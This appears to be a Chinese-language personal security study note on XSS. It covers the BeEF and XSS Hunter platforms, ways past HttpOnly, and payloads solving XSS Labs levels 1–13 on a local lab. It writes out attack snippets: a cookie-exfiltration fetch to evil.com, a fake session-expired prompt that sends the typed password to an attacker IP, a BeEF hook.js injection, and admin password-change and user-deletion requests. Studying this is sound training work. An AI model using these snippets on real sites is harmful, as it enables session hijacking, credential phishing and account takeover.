# 2026-08-03 XSS 平台与工具利用 + HttpOnly 绕过 + XSS Labs 1~13

## 一、XSS 平台 — 能做什么？

### 1.1 先搞清楚一个场景：不是所有 XSS 你都能直接看到

```
反射型 XSS：URL 发过去，当场弹窗 → 你马上知道成功了 ✅

存储型 XSS：留言提交了，管理员审核时触发 → 你看不到，也不知道什么时候触发 ❓

Blind XSS：触发位置在日志后台 / 内部系统 / 别人账号里 → 你完全看不见 ❌
```

**XSS 平台就是解决"我看不到触发结果"这个问题的。**

### 1.2 BeEF（浏览器利用框架）

**工作原理**：
```
① 你在页面里注入 hook.js
    <script src="http://你的IP:3000/hook.js"></script>

② 受害者浏览器加载这个脚本 → 浏览器被 BeEF "hook"（挂勾）

③ BeEF 控制台里出现一台"在线"的浏览器

④ 你可以对这个浏览器发送指令：弹窗、重定向、扫描内网、社工钓鱼...
```

**能做什么**：

| 模块类型 | 具体操作 |
|---------|---------|
| **信息收集** | 获取浏览器指纹、已装插件、屏幕分辨率、内网 IP |
| **社会工程** | 弹出伪造的登录框、Flash 更新提示 |
| **网络探测** | 以受害者浏览器为跳板，扫描内网端口和服务 |
| **持久化** | 即使受害者关闭了被注入的页面，也能保持控制 |

**部署**（你本地就能搭）：
```bash
# BeEF 默认监听 3000 端口
# hook.js 地址就是 http://你本机IP:3000/hook.js
# 注入时用 <script src="http://192.168.x.x:3000/hook.js"></script>
```

### 1.3 XSS Hunter / ezXSS（Blind XSS 回连平台）

**和 BeEF 的区别**：BeEF 适合"你已经知道触发了，要深度操控"；Blind XSS 平台适合"不确定有没有触发，先埋点等着收信息"。

**工作流程**：
```
① 在平台的网站上注册一个子域名（如 tony.xss.ht）
② 平台给你一段 JS：<script src="//tony.xss.ht"></script>
③ 你把这段 JS 注入到目标网站的留言/评论/任何输入框
④ 有人（包括管理员）浏览到包含这段 JS 的页面时：
   → JS 自动执行
   → 自动截图页面（管理员后台长什么样）
   → 收集 Cookie、localStorage、页面 HTML
   → 全部回传到你的 XSS Hunter 控制台
```

**为什么这是个游戏改变者**：你提交一段恶意留言，过了两天登录平台一看——管理员后台的截图 + 管理员 cookie 已经在等你了。全程自动化，不需要你蹲点。

### 1.4 什么时候用哪个？

| 场景 | 工具 |
|------|------|
| 靶场练习，想直观感受"控制浏览器" | BeEF |
| 挖漏洞/渗透，不确定XSS在哪触发 | XSS Hunter / ezXSS |
| 手动测试，看回显、调 Payload | F12 DevTools |
| 批量扫描，找反射型 XSS | XSStrike / Dalfox |

---

## 二、XSS 扫描工具

| 工具 | 语言 | 特点 |
|------|------|------|
| **XSStrike** | Python | 智能模糊测试，WAF 检测，Payload 质量高 |
| **Dalfox** | Go | 速度快，参数自动发现，支持管道 |
| **XSSer** | Python | 老牌，GET/POST，绕过规则多 |
| **Burp Suite** | Java | 手动 Repeater + 自动 Scanner |

> 💡 现阶段你的重点是**手工分析 + F12**，工具以后做渗透时再用。手工打不通的地方，工具大概率也打不通。

---

## 三、HttpOnly 绕过 — 深度理解

### 3.1 问题来源

你在做 XSS 测试时发现：有些 Cookie 完全拿不到。比如常见的 Session Cookie：

```http
Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure
```

加了 `HttpOnly` 标记后，JavaScript 的 `document.cookie` 对这个 Cookie 完全不可见。

```javascript
console.log(document.cookie);
// 输出：other_info=xxx
// PHPSESSID 不在里面，因为它是 HttpOnly
```

### 3.2 那 XSS 不就废了吗？

**不。XSS 只是不能"偷"了，但还能"用"。**

打个比方：

```
❌ 没 HttpOnly 时：你偷了钥匙配了一把，随时自己开门。
                   fetch('//evil.com?c='+document.cookie) ← 能读到

✅ 有 HttpOnly 时：钥匙在别人口袋里，你摸不出来。
                   document.cookie 里看不到 PHPSESSID

   但！你可以抓着别人的手，让他替你开门。
   浏览器发请求时会自动带上 HttpOnly Cookie，
   你不需要自己读它。
```

### 3.3 具体做法：XSS + 自动操作（不需要读 Cookie）

**做法一：以受害者身份自动发请求**

```javascript
// 浏览器自动带着所有 Cookie（包括 HttpOnly 的），你不需要读它
fetch('/admin/delete_user.php?id=123', {
    method: 'POST',
    credentials: 'include'  // 浏览器自动带上 Cookie！
});
// 这条请求以管理员身份发出，服务器照单全收
```

**做法二：自动改密码（把管理员密码改成自己的）**

```javascript
// XSS 注入这段 JS → 管理员浏览时 →
// 自动打开修改密码页面（Cookie 自动带，不需要读）
// 自动填表提交，把密码改成 "hacked123"
fetch('/admin/change_password.php', {
    method: 'POST',
    credentials: 'include',
    body: 'old_password=xxx&new_password=hacked123'
});
```

**做法三：钓鱼弹窗（绕过 HttpOnly 的终极手段）**

管理员看到奇怪弹窗，你骗他输入密码：

```javascript
var pwd = prompt('会话已过期，请重新输入密码：');
fetch('http://你的IP/collect?p=' + pwd);  // 管理员自己输入的，和 Cookie 无关
```

### 3.4 HttpOnly 到底防了什么，没防什么？

| 攻击方式 | HttpOnly 能防吗？ | 说明 |
|----------|:---:|------|
| `document.cookie` 偷 cookie | ✅ 防住 | Cookie 对 JS 不可见 |
| 自动发请求（以受害者身份）| ❌ 防不住 | 浏览器自动带 Cookie |
| 钓鱼弹窗 | ❌ 防不住 | 和 Cookie 无关 |
| 页面篡改（挂黑页）| ❌ 防不住 | 不涉及 Cookie |
| 内网探测（端口扫描）| ❌ 防不住 | 不涉及 Cookie |

### 3.5 完整防御：HttpOnly + CSP

HttpOnly 只是防御体系的一部分：

```
HttpOnly → 防"偷 Cookie"
CSP      → 防"注入的脚本被执行"（更根本）
输出编码  → 防"注入发生"（最根本）
```

---
## 四、XSS Labs 实战进度（Level 1~13）

> 靶场地址：`http://localhost:8084`

### 4.1 第一 ~ 九关：基础标签 + 事件 + 编码

| 关卡 | 你的输入放在哪 | 考点 | Payload |
|------|--------------|------|---------|
| Level 1 | HTML 正文 | `<script>` 直接注入 | `<script>alert(1)</script>` |
| Level 2 | `<input value="">` 属性中 | 闭合属性 + 加事件 | `" onclick="alert(1)` |
| Level 3 | 同 Level 2，过滤了尖括号 | HTML 实体编码绕过 `<>` 过滤 | `' onclick='alert(1)` |
| Level 4 | `<input value="">` 带尖括号过滤 | 引号闭合 + 事件 | `" onfocus="alert(1)" autofocus="` |
| Level 5 | `<a href="">` 中，`<script>` 被过滤 | `javascript:` 伪协议 | `<a href="javascript:alert(1)">点我</a>` |
| Level 6 | 同 Level 5，含 `on` 被替换 | 大小写绕过 `O` 替换 | `"Onclick="alert(1)` |
| Level 7 | `<a href="">` 中，`on` / `script` / `href` 被替换 | 双写绕过 | `" oonnmouseover="alert(1)` |
| Level 8 | `<a href="">` 中，`javascript` 被替换成 `_` | **HTML 实体编码** | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)` |
| Level 9 | `<a href="">` 中，链接必须含 `http://` | **利用注释绕过 URL 校验** | `javascript:alert(1) // http://` |

### 4.2 第十 ~ 十三关：隐藏表单 + HTTP 头注入

| 关卡 | 注入位置 | 特殊点 | Payload |
|------|---------|--------|---------|
| Level 10 | GET `t_sort` | `type="hidden"` 不可见 | `" onclick="alert(1)" type="text` |
| Level 11 | **HTTP Referer 头** | 不在 URL 里，Burp 改请求头 | `Referer: " onclick="alert(1)" type="text` |
| Level 12 | **HTTP User-Agent 头** | 同上思路 | `User-Agent: " onclick="alert(1)" type="text` |
| Level 13 | **Cookie** | 三个 HTTP 头注入点覆盖 | `Cookie: user=" onclick="alert(1)" type="text` |

### 4.3 `type="hidden"` 的绕过技巧

Level 10~13 的共同套路——你的输入被拼进一个 `type="hidden"` 的 input 标签里，不可点。

```html
<!-- 原本 -->
<input name="t_sort" value="你的输入" type="hidden">

<!-- 注入后 -->
<input name="t_sort" value="" onclick="alert(1)" type="text" type="hidden">
                                              ↑ 第一个 type="text" 生效
                                              → 输入框可见 → 点击触发事件
```

> HTML 遇到同名属性时，**第一个生效**。

### 4.4 为什么 Level 11~13 要在 Burp 里做

```
Level 10 → t_sort 在 URL 参数里，直接改 URL ✅
Level 11 → Referer 在 HTTP 请求头里，URL 里没有 ❌
Level 12 → User-Agent 在 HTTP 请求头里，URL 里没有 ❌
Level 13 → Cookie 在 HTTP 请求头里，URL 里没有 ❌

→ 必须用 Burp 抓包 → 改请求头 → Forward
```

这和 SQLi-Labs 的经验完全对应：
```
Less-18 → User-Agent 注入
Less-19 → Referer 注入
Less-20 → Cookie 注入
```

**你已经在两个靶场验证了同一个道理：HTTP 请求头也是输入，也会被拼进数据库/HTML。**

---

## 五、总结

### 核心认知

1. **XSS 平台让"看不见的攻击"可见**：BeEF 操控浏览器，XSS Hunter 自动化收集 Blind XSS 信息
2. **HttpOnly 防偷不防用**：不能读 Cookie 不等于不能操控浏览器做事
3. **XSS 注入点不只是 URL 参数**：HTTP 头（Referer、User-Agent、Cookie）同样是攻击面
4. **绕过就是利用两套系统理解不一致**：HTML 实体编码、大小写、双写，和 SQL 注入绕过同源

### 关联笔记

- [XSS 入门认知框架](./2026-08-02-XSS跨站脚本攻击入门.md) — 原理/反射型·存储型·DOM 型/防御方案
- [SQLi-Labs Less-17~20](./2026-08-02-SQLi-Labs进阶与注入点识别.md) — HTTP 头注入（User-Agent/Referer/Cookie）
- [SQLi-Labs Less-21~25](./2026-08-03-SQLi-Labs-Less21-25进阶.md) — AND/OR 绕过

### 待深入

- [ ] 部署 BeEF 做一次"注入 hook.js → 操控浏览器"的完整链条
- [ ] 理解 CSP（Content-Security-Policy） — HttpOnly 的上层防御
- [ ] XSS Labs Level 14~20 继续

> ⚠️ 声明：以上技术仅用于授权靶场和渗透测试授权目标，未经授权使用属于违法行为。
